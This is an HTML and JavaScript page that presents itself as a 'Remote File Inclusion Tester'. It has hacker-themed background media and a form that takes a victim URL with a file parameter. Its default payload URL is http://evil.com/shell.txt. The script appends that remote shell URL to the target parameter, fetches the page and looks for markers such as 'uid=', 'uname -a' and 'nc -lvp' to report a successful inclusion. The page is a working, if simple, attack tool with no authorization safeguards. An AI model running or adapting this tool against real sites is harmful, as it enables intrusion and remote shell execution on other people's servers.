<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Remote File Inclusion Tester</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: #000;
      color: #c58b00;
      overflow-x: hidden;
    }

    video#bg-video {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      min-width: 100vw;
      min-height: 100vh;
      object-fit: cover;
      opacity: 0.2;
      z-index: -2;
    }

    audio#bg-music {
      position: fixed;
      z-index: -1;
      opacity: 0;
      pointer-events: none;
    }

    .container {
      max-width: 920px;
      margin: 50px auto;
      background: rgba(0, 0, 0, 0.4);
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
    }

    h1, h3, label {
      color: #c58b00;
    }

    input, pre, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      background: rgba(0, 0, 0, 0.5);
      color: #c58b00;
      border: 1px solid #c58b00;
      border-radius: 5px;
      font-size: 1rem;
    }

    button {
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #000;
      color: red;
    }

    .section {
      margin-top: 20px;
    }

    .history-item {
      border-bottom: 1px solid red;
      padding: 5px;
      font-size: 0.9rem;
      color: #ff8800;
    }

    @media (max-width: 768px) {
      .container { margin: 20px 10px; padding: 15px; }
      button { width: 100%; margin: 8px 0; }
    }
  </style>
</head>
<body>

<!-- üé• Background Video -->
<video id="bg-video" autoplay muted loop playsinline>
  <source src="background/1761817527453041720p.mp4" type="video/mp4">
</video>

<!-- üéµ Background Music -->
<audio id="bg-music" loop>
  <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg">
</audio>

<div class="container">
  <h1>Remote File Inclusion Tester</h1>

  <label for="url-input">Target URL (with parameter):</label>
  <input id="url-input" placeholder="https://victim.com/load.php?file=">

  <label for="remote-url-input">Remote Payload URL:</label>
  <input id="remote-url-input" value="http://evil.com/shell.txt">

  <button onclick="scanRFI()">Scan</button>
  <button onclick="clearAll()">Clear</button>

  <div class="section">
    <h3>Scan Result</h3>
    <pre id="result-box">{}</pre>
  </div>

  <div class="section">
    <h3>Raw Response (partial)</h3>
    <pre id="raw-response" style="max-height: 300px; overflow-y: auto;"></pre>
  </div>

  <div class="section">
    <h3>History</h3>
    <div id="history-box"></div>
  </div>
</div>

<script>
  const music = document.getElementById("bg-music");
  const urlInput = document.getElementById("url-input");
  const remoteInput = document.getElementById("remote-url-input");
  const resultBox = document.getElementById("result-box");
  const rawBox = document.getElementById("raw-response");
  const historyBox = document.getElementById("history-box");

  window.addEventListener("click", () => {
    music.play().catch(() => {});
  }, { once: true });

  function scanRFI() {
    const baseURL = urlInput.value.trim();
    const remoteURL = remoteInput.value.trim();

    if (!baseURL || !remoteURL || !baseURL.includes("=")) {
      alert("‚ö†Ô∏è Please enter a valid vulnerable URL and remote file URL.");
      return;
    }

    const fullURL = (baseURL.endsWith("=") ? baseURL : baseURL + (baseURL.includes("?") ? "&" : "?")) + encodeURIComponent(remoteURL);

    fetch(fullURL)
      .then(res => res.text())
      .then(html => {
        rawBox.textContent = html.slice(0, 3000);

        const signs = [
          "php shell", "cmd", "uname -a", "uid=", "root", "System32", "bash", "nc -lvp"
        ];

        const isVulnerable = signs.some(sig => html.toLowerCase().includes(sig));
        resultBox.textContent = isVulnerable
          ? `üõë Potential RFI Detected! Remote content appears included.`
          : `‚úÖ No RFI signs found in response.`;

        logHistory(fullURL, isVulnerable);
      })
      .catch(err => {
        resultBox.textContent = `‚ö†Ô∏è Error: ${err.message}`;
        rawBox.textContent = "";
      });
  }

  function logHistory(url, vulnerable) {
    const div = document.createElement("div");
    div.className = "history-item";
    div.textContent = `${new Date().toLocaleString()} ‚Äî ${vulnerable ? "üõë Vulnerable" : "‚úÖ Clean"} ‚Üí ${url}`;
    historyBox.prepend(div);
  }

  function clearAll() {
    urlInput.value = "";
    remoteInput.value = "http://evil.com/shell.txt";
    resultBox.textContent = "{}";
    rawBox.textContent = "";
  }
</script>

</body>
</html>
